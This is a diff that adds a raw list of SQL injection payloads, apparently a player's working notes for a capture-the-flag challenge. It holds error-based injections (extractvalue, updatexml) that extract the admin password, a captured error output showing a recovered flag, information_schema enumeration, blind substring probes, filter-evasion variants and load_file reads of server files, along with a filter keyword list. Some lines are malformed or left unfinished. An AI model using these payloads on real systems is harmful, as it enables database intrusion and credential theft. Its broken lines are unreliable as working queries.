@@ -1,0 +1,98 @@
+'union SELECT extractvalue(3,concat(0x4d,(SELECT upw FROM user WHERE uid='admin'),1));
+
+(1105, "XPATH syntax error: ':DH{c3968c78840750168774ad951fc98bf788563c4d}")
+
+
+'union SELECT updatexml(null,concat(0x4b,(SELECT upw FROM user WHERE uid='admin')),null);
+
+
+
+'union SELECT extractvalue(0,concat(0x1a,(SELECT upw FROM user WHERE uid='admin')));
+
+
+'union SELECT extractvalue(0,concat(0x3b,(ascii(SUBSTR((SELECT upw FROM user WHERE uid='admin' limit 0,1),10,1))) > 200));
+
+'Union ASCII(SUBSTR((SELECT upw FROM information_schema.tables WHERE uid='admin' limit 0,1),1,1)) > 100
+
+
+
+admin 'union select updatexml(1, concat(0x2e, (select concat_ws(1, upw) from user limit 0,1)),1);
+
+
+'union select extractvalue(1, concat(0x2e, ascii(substr((select upw from user where uid='admin' limit 0,1),0,1))= 0));
+
+admin 'union select * from user where uid= 'admin';
+
+admin and upw = 'union SELECT extractvalue(3,concat(0x4d,(select+p455w0rd_c0l+from+m3mbr35t4b+limit+1+offset+0)+as+numeric)));
+
+
+'and extractvalue(3,concat(0x4d,(select upw from user limit 1 offset 0),1));
+
+admin' and extractvalue(0x0a,concat((select upw )));
+
+admin' limit 0,1 procedure analyse(extractvalue(1, concat(0x3a, (SELECT upw FROM user WHERE uid='admin'))), 1);
+
+admin' and extractvalue(0x1a,concat(0x4b, (SELECT REVERSE(upw) limit 0,1)));
+'union SELECT extractvalue(3,concat(0x4d,(SELECT upw FROM user WHERE uid='admin'),1));
+
+procedure analyse()
+
+admin'and extractvalue(3,concat(0x4d,(select uid from user where upw like "DH{c3968c78840750168774ad951fc9%")));
+
+select uid from users where uid="admin" and upw like "pw1%"  #
+
+'union SELECT updatexml(null,concat(0x4b,(select upw from user where upw like "DH{c3968c78840750168774ad951fc9%")),null);
+
+
+admin' and extractvalue(0x1a,concat(0x4b, (select upw from user where 1=0 or (select @a:=upw where uid='admin') union select @a;)));
+
+select upw from user where 1=0 or (select @a:=upw where uid='admin') union select @a;
+
+'and extractvalue(0,concat(0x1a,(SELECT upw FROM user WHERE uid='admin')));
+'and extractvalue(0,concat(0x1a,(SELECT database()))); = users
+'and extractvalue(0,concat(0x1a,(select table_name from information_schema.tables where table_schema=database() limit 0,1))); = user
+
+'and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name='user' limit 0,1))); = idx
+
+'and extractvalue(0x0a,concat(0x0a,(select count(idx,uid,upw) from user limit 0,1)));
+'and extractvalue(0x0a,concat(0x0a,(select substr(upw,20,32) from user where idx=1)));
+
+'Union%09Select%09null,upw,null%09From%09user%09where%09uid=\"Admin\"%23
+'Un%a0ion%a0Sel%a0ect%a0null,upw,null%a0Fr%a0om%a0user%a0where%a0uid="upw"#
+
+%55niON %53Elect 1,2,3,4,5,6#
+
+`Union`Select`1,"Bypass%09WAF",1;
+=====================
+keywords = ['union', 'select', 'from', 'and', 'or', 'admin', ' ', '*', '/', 
+            '\n', '\r', '\t', '\x0b', '\x0c', '-', '+']
+			
+			
+'Union||Select||null,upw,null||From||user||where||uid=reverse("nimda")#';
+
+
+'Union	Select	null,upw,null	From	user	where	uid=reverse("nimda")#';
+
+
+'UnioN%0aSelEcT%0amid(@@version,12,1)#';
+
+'%09procedure%09analyse()#';
+'||s%e%l%e%c%t%09version()#';
+
+'||SelEct%09F
+
+'||s%E%l%e%c%T%09null,upw,null%09F%r%O%m%09user%09where%09uid=reverse("nimda")#';
+
+'s%E%l%e%c%T`mid(@@version,12,1)`#';
+
+'&%09substr(load_file('file'),locate('DocumentRoot',(load_file('file')))+length('DocumentRoot'),10)='a
+' and substr(load_file('file'),locate('DocumentRoot',(load_file('file')))+length('DocumentRoot'),10)='a
+
+||'1=1;%00'
+%00
+
+'(contat(a,d,m,i,n)'#;
+
+'&&substr(load_file(),locate(,(load_file()))#';
+
+'having((information_schema.tables)like(0x61646d696e))#';
